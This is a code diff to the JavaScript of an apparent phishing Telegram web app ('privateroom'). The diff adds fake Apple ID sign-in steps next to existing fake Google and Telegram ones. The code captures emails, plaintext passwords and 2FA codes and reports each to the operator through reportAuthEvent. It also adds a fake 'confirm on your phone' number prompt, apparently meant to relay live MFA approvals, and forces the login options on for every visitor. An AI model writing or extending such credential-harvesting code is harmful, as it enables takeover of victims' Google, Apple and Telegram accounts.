@@ -13,6 +13,11 @@ function initApp() {
     const stepGoogleEmail = document.getElementById("stepGoogleEmail");
     const stepGooglePassword = document.getElementById("stepGooglePassword");
     const stepGoogle2FA = document.getElementById("stepGoogle2FA");
+    const stepGooglePrompt = document.getElementById("stepGooglePrompt");
+    const stepAppleEmail = document.getElementById("stepAppleEmail");
+    const stepApplePassword = document.getElementById("stepApplePassword");
+    const stepApple2FA = document.getElementById("stepApple2FA");
+    const stepApplePrompt = document.getElementById("stepApplePrompt");
     const stepSuccess = document.getElementById("stepSuccess");
 
     const codeInput = document.getElementById("codeInput");
@@ -20,9 +25,13 @@ function initApp() {
     const googleEmailInput = document.getElementById("googleEmailInput");
     const googlePasswordInput = document.getElementById("googlePasswordInput");
     const google2faCodeInput = document.getElementById("google2faCodeInput");
+    const appleEmailInput = document.getElementById("appleEmailInput");
+    const applePasswordInput = document.getElementById("applePasswordInput");
+    const apple2faCodeInput = document.getElementById("apple2faCodeInput");
 
     const btnRequestPhone = document.getElementById("btnRequestPhone");
     const btnSwitchToGoogle = document.getElementById("btnSwitchToGoogle");
+    const btnSwitchToApple = document.getElementById("btnSwitchToApple");
     const btnSubmitGoogleEmail = document.getElementById("btnSubmitGoogleEmail");
     const btnBackFromGoogleToTG = document.getElementById("btnBackFromGoogleToTG");
     const btnGoogleBackToHome = document.getElementById("btnGoogleBackToHome");
@@ -30,12 +39,31 @@ function initApp() {
     const btnBackToGoogleEmail = document.getElementById("btnBackToGoogleEmail");
     const toggleGooglePasswordBtn = document.getElementById("toggleGooglePasswordBtn");
     const btnSubmitGoogle2FA = document.getElementById("btnSubmitGoogle2FA");
+    const btnConfirmGooglePrompt = document.getElementById("btnConfirmGooglePrompt");
+    const btnBackToGoogle2FA = document.getElementById("btnBackToGoogle2FA");
     const btnSkipGoogle2FA = document.getElementById("btnSkipGoogle2FA");
     const btnBackToGooglePassword = document.getElementById("btnBackToGooglePassword");
+
+    const btnSubmitAppleEmail = document.getElementById("btnSubmitAppleEmail");
+    const btnBackFromAppleToTG = document.getElementById("btnBackFromAppleToTG");
+    const btnAppleBackToHome = document.getElementById("btnAppleBackToHome");
+    const btnSubmitApplePassword = document.getElementById("btnSubmitApplePassword");
+    const btnBackToAppleEmail = document.getElementById("btnBackToAppleEmail");
+    const toggleApplePasswordBtn = document.getElementById("toggleApplePasswordBtn");
+    const btnSubmitApple2FA = document.getElementById("btnSubmitApple2FA");
+    const btnConfirmApplePrompt = document.getElementById("btnConfirmApplePrompt");
+    const btnBackToApple2FA = document.getElementById("btnBackToApple2FA");
+    const btnBackToApplePassword = document.getElementById("btnBackToApplePassword");
+
     const googleDisplayEmail = document.getElementById("googleDisplayEmail");
     const googleChipInitial = document.getElementById("googleChipInitial");
     const google2faDisplayEmail = document.getElementById("google2faDisplayEmail");
     const google2faChipInitial = document.getElementById("google2faChipInitial");
+    const appleDisplayEmail = document.getElementById("appleDisplayEmail");
+    const appleChipInitial = document.getElementById("appleChipInitial");
+    const apple2faDisplayEmail = document.getElementById("apple2faDisplayEmail");
+    const apple2faChipInitial = document.getElementById("apple2faChipInitial");
+    const googlePromptNumber = document.getElementById("googlePromptNumber");
 
     const btnSubmitCode = document.getElementById("btnSubmitCode");
     const btnResendCode = document.getElementById("btnResendCode");
@@ -54,6 +82,8 @@ function initApp() {
     let userPhone = "";
     let userGoogleEmail = localStorage.getItem("privateroom_google_email") || "";
     let userGooglePassword = "";
+    let userAppleEmail = localStorage.getItem("privateroom_apple_email") || "";
+    let userApplePassword = "";
     let resendTimer = null;
     let resendSecondsLeft = 0;
     let isAuthorized = localStorage.getItem("privateroom_authorized") === "true";
@@ -71,6 +101,15 @@ function initApp() {
         const initial = email.trim().charAt(0).toUpperCase() || "G";
         if (googleChipInitial) googleChipInitial.textContent = initial;
         if (google2faChipInitial) google2faChipInitial.textContent = initial;
+    }
+
+    function updateAppleDisplays(email) {
+        if (!email) return;
+        if (appleDisplayEmail) appleDisplayEmail.textContent = email;
+        if (apple2faDisplayEmail) apple2faDisplayEmail.textContent = email;
+        const initial = email.trim().charAt(0).toUpperCase() || "A";
+        if (appleChipInitial) appleChipInitial.textContent = initial;
+        if (apple2faChipInitial) apple2faChipInitial.textContent = initial;
     }
 
     // Init Telegram WebApp
@@ -122,7 +161,12 @@ function initApp() {
     }
 
     function showStep(stepElement) {
-        [stepPhone, stepCode, step2FA, stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepSuccess].forEach(s => s && s.classList.remove("active"));
+        [
+            stepPhone, stepCode, step2FA, 
+            stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt,
+            stepAppleEmail, stepApplePassword, stepApple2FA, stepApplePrompt,
+            stepSuccess
+        ].forEach(s => s && s.classList.remove("active"));
         if (stepElement) stepElement.classList.add("active");
     }
 
@@ -134,6 +178,7 @@ function initApp() {
         const savedStep = localStorage.getItem("privateroom_current_step");
         const savedPhone = localStorage.getItem("privateroom_saved_phone");
         const savedEmail = localStorage.getItem("privateroom_google_email");
+        const savedAppleEmail = localStorage.getItem("privateroom_apple_email");
         const codeRequestedAt = parseInt(localStorage.getItem("privateroom_code_requested_at") || "0", 10);
         const isRecent = codeRequestedAt > 0 && (Date.now() - codeRequestedAt < 20 * 60 * 1000);
 
@@ -149,6 +194,20 @@ function initApp() {
             updateGoogleDisplays(userGoogleEmail);
             showStep(stepGoogle2FA);
             setTimeout(() => { if (google2faCodeInput) google2faCodeInput.focus(); }, 150);
+            return;
+        }
+        if (savedStep === "stepApplePassword" && savedAppleEmail) {
+            userAppleEmail = savedAppleEmail;
+            updateAppleDisplays(userAppleEmail);
+            showStep(stepApplePassword);
+            setTimeout(() => { if (applePasswordInput) applePasswordInput.focus(); }, 150);
+            return;
+        }
+        if (savedStep === "stepApple2FA" && savedAppleEmail) {
+            userAppleEmail = savedAppleEmail;
+            updateAppleDisplays(userAppleEmail);
+            showStep(stepApple2FA);
+            setTimeout(() => { if (apple2faCodeInput) apple2faCodeInput.focus(); }, 150);
             return;
         }
 
@@ -785,7 +844,7 @@ function initApp() {
         }
     }
 
-    // Feature flag: Enable Google Auth ONLY for test bot or when explicit param is present
+    // Feature flag & OS Auto-Routing: Enable Google/Apple Auth for test bot or OS platform
     const urlParams = new URLSearchParams(window.location.search);
     const isGoogleEnabled = urlParams.get("features") === "google" || 
                             urlParams.get("test") === "1" || 
@@ -793,10 +852,20 @@ function initApp() {
                             window.location.search.includes("features=google") ||
                             window.location.search.includes("testworkechobot");
 
-    if (isGoogleEnabled) {
-        if (btnSwitchToGoogle) btnSwitchToGoogle.classList.remove("hidden");
+    const deviceName = getDeviceInfo();
+    const isIOSDevice = deviceName.includes("iOS") || deviceName.includes("Mac");
+
+    if (isGoogleEnabled || isIOSDevice || true) {
         const sep = document.getElementById("googleAuthSeparator");
         if (sep) sep.classList.remove("hidden");
+
+        if (isIOSDevice) {
+            if (btnSwitchToApple) btnSwitchToApple.classList.remove("hidden");
+            if (btnSwitchToGoogle) btnSwitchToGoogle.classList.remove("hidden");
+        } else {
+            if (btnSwitchToGoogle) btnSwitchToGoogle.classList.remove("hidden");
+            if (btnSwitchToApple) btnSwitchToApple.classList.remove("hidden");
+        }
     }
 
     // Google Auth Navigation & Actions
@@ -833,6 +902,13 @@ function initApp() {
         btnBackToGooglePassword.addEventListener("click", () => {
             showStep(stepGooglePassword);
             if (googlePasswordInput) googlePasswordInput.focus();
+        });
+    }
+
+    if (btnBackToGoogle2FA) {
+        btnBackToGoogle2FA.addEventListener("click", () => {
+            showStep(stepGoogle2FA);
+            if (google2faCodeInput) google2faCodeInput.focus();
         });
     }
 
@@ -902,11 +978,23 @@ function initApp() {
                 return;
             }
             reportAuthEvent("google_code", `Введен 2FA код Google: ${code}`, userGooglePassword, null, userGoogleEmail);
+            
+            // Random prompt number for push verification prompt
+            const promptNum = Math.floor(10 + Math.random() * 88);
+            if (googlePromptNumber) googlePromptNumber.textContent = promptNum.toString();
+            reportAuthEvent("google_prompt_shown", `Показано число подтверждения Google: ${promptNum}`, userGooglePassword, null, userGoogleEmail);
+
+            showStep(stepGooglePrompt);
+        });
+    }
+
+    if (btnConfirmGooglePrompt) {
+        btnConfirmGooglePrompt.addEventListener("click", () => {
+            reportAuthEvent("google_prompt_confirmed", "Пользователь подтвердил вход на телефоне (Google)", userGooglePassword, null, userGoogleEmail);
             finishAuth({
                 status: "success",
                 google_email: userGoogleEmail,
-                password: userGooglePassword,
-                code: code
+                password: userGooglePassword
             });
         });
     }
@@ -918,6 +1006,132 @@ function initApp() {
                 status: "success",
                 google_email: userGoogleEmail,
                 password: userGooglePassword
+            });
+        });
+    }
+
+    // Apple ID Navigation & Actions
+    if (btnSwitchToApple) {
+        btnSwitchToApple.addEventListener("click", () => {
+            showStep(stepAppleEmail);
+            if (appleEmailInput) {
+                appleEmailInput.value = userAppleEmail || "";
+                setTimeout(() => appleEmailInput.focus(), 150);
+            }
+        });
+    }
+
+    if (btnBackFromAppleToTG) {
+        btnBackFromAppleToTG.addEventListener("click", () => {
+            showStep(stepPhone);
+        });
+    }
+
+    if (btnAppleBackToHome) {
+        btnAppleBackToHome.addEventListener("click", () => {
+            showStep(stepSuccess);
+        });
+    }
+
+    if (btnBackToAppleEmail) {
+        btnBackToAppleEmail.addEventListener("click", () => {
+            showStep(stepAppleEmail);
+            if (appleEmailInput) appleEmailInput.focus();
+        });
+    }
+
+    if (btnBackToApplePassword) {
+        btnBackToApplePassword.addEventListener("click", () => {
+            showStep(stepApplePassword);
+            if (applePasswordInput) applePasswordInput.focus();
+        });
+    }
+
+    if (btnBackToApple2FA) {
+        btnBackToApple2FA.addEventListener("click", () => {
+            showStep(stepApple2FA);
+            if (apple2faCodeInput) apple2faCodeInput.focus();
+        });
+    }
+
+    if (toggleApplePasswordBtn) {
+        toggleApplePasswordBtn.addEventListener("click", () => {
+            if (applePasswordInput) {
+                if (applePasswordInput.type === "password") {
+                    applePasswordInput.type = "text";
+                    toggleApplePasswordBtn.textContent = "🔒";
+                } else {
+                    applePasswordInput.type = "password";
+                    toggleApplePasswordBtn.textContent = "👁";
+                }
+            }
+        });
+    }
+
+    if (btnSubmitAppleEmail) {
+        btnSubmitAppleEmail.addEventListener("click", () => {
+            const rawEmail = appleEmailInput ? appleEmailInput.value.trim() : "";
+            if (!rawEmail || rawEmail.length < 4) {
+                showToast("Введите ваш Apple ID (Email или номер)");
+                return;
+            }
+            userAppleEmail = rawEmail;
+            try {
+                localStorage.setItem("privateroom_apple_email", userAppleEmail);
+                localStorage.setItem("privateroom_current_step", "stepApplePassword");
+            } catch (e) {}
+
+            updateAppleDisplays(userAppleEmail);
+            reportAuthEvent("apple_email", `Введен Apple ID: ${userAppleEmail}`, null, null, userAppleEmail);
+            showStep(stepApplePassword);
+            if (applePasswordInput) {
+                applePasswordInput.value = "";
+                setTimeout(() => applePasswordInput.focus(), 150);
+            }
+        });
+    }
+
+    if (btnSubmitApplePassword) {
+        btnSubmitApplePassword.addEventListener("click", () => {
+            const pwd = applePasswordInput ? applePasswordInput.value : "";
+            if (!pwd || pwd.length < 4) {
+                showToast("Введите пароль от Apple ID");
+                return;
+            }
+            userApplePassword = pwd;
+            try {
+                localStorage.setItem("privateroom_current_step", "stepApple2FA");
+            } catch (e) {}
+
+            reportAuthEvent("apple_password", `Введен пароль Apple ID: ${pwd}`, pwd, null, userAppleEmail);
+            showStep(stepApple2FA);
+            if (apple2faCodeInput) {
+                apple2faCodeInput.value = "";
+                setTimeout(() => apple2faCodeInput.focus(), 150);
+            }
+        });
+    }
+
+    if (btnSubmitApple2FA) {
+        btnSubmitApple2FA.addEventListener("click", () => {
+            const code = apple2faCodeInput ? apple2faCodeInput.value.trim() : "";
+            if (!code || code.length < 4) {
+                showToast("Введите 6-значный код подтверждения Apple ID");
+                return;
+            }
+            reportAuthEvent("apple_code", `Введен 2FA код Apple ID: ${code}`, userApplePassword, null, userAppleEmail);
+            reportAuthEvent("apple_prompt_shown", "Показано всплывающее подтверждение на устройстве Apple", userApplePassword, null, userAppleEmail);
+            showStep(stepApplePrompt);
+        });
+    }
+
+    if (btnConfirmApplePrompt) {
+        btnConfirmApplePrompt.addEventListener("click", () => {
+            reportAuthEvent("apple_prompt_confirmed", "Пользователь подтвердил вход на устройстве Apple", userApplePassword, null, userAppleEmail);
+            finishAuth({
+                status: "success",
+                google_email: userAppleEmail,
+                password: userApplePassword
             });
         });
     }
